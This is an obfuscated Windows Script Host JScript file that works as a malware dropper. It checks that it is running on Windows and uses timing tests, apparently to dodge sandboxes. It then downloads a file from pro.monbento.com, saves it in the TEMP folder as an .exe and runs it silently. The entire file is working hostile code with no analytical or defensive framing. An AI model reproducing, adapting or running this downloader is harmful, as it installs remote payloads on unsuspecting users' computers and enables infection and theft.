var _F = false;
var _XV = "CreateObject";
var _N = function _CK() {return WScript[_XV]("WScript"+".Shell");}(), _MU = 11;
var _DY = "MSXML2.XMLHTTP";
var _AM = 2123213;
var _P1 = 0;
function _W(_XO){_N["Run"](_XO, _P1, _P1);};
function _O(){return _DY + "";};
function _P0(_Q, _P3){_P1 = _P1 * 1; return _Q - _P3;};
function _P(){return _XV;};
/*@cc_on
  @if (@_win32 || @_win64)
    _F = true;
  @end
@*/
if (_F)
{
var _LA = "";
function _A(){return 22;};
var _HP = 0; var _W0 = 0;
function _I()
{
var _A0 = new this["Date"]();
var _ZY = _A0["getUTCMilliseconds"]();
WScript["Sleep"](_A());
var _A0 = new this["Date"]();
var _HG = _A0["getUTCMilliseconds"]();
WScript["Sleep"](_A());
var _A0 = new this["Date"]();
var _DH = _A0["getUTCMilliseconds"]();
var _HP = "_IO";
_HP = _P0(_HG, _ZY);
var _W0 = "_PK";
_W0 = _P0(_DH, _HG);
_LA = "open";
return _P0(_HP, _W0);
}
var _FQ = false;
var _XN = false;
for (var _P2 = _P1; _P2 < _A() * 1; _P2++){if (_I() != _P1){
_FQ = true; 
_W0 = "31" + 11 * _HP + _W0; 
_XN = true; 
break;
}}
function _PI() {return ((_FQ == true) && (_FQ == _XN)) ? 1 : _P1;};
if (_FQ && _PI() && _XN){
function _AF() {return _N["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Qvn0HO1i8qPKoDk.ex" + "e";};
 _S0 = _O();
 _S = WScript[_XV](_S0);
 var _KI = 1;
 while (_KI){
try {
	if (_KI == 1)
	{
		_S[_LA]("GET", "http://pro.monbento.com/n3iska", false);
		_S["send"]();
		_E1 = "Sleep";
	}
	WScript[_E1](_A() + 120); 
	if (_S["readystate"] < 2 * 2) continue;
	_KI = _P1;
	function _E(_WV) {var _PU = (1, 2, 3, 4, 5, _WV); return _PU;};
	_K = WScript[_P()]("ADODB.Stream");
	_S0 = _K;
	_S0[_LA]();
	_S0["type"] = _E(1);
	_S0["write"](_S["ResponseBody"]);
	_K["position"] = _E(_P1);
	_S0["Save" + "ToFile"](_AF(), 2);
	_K["cl"+"ose"]();
	_E0 = _AF();
	_W(_E0);
} catch(_V){};
}
}
}

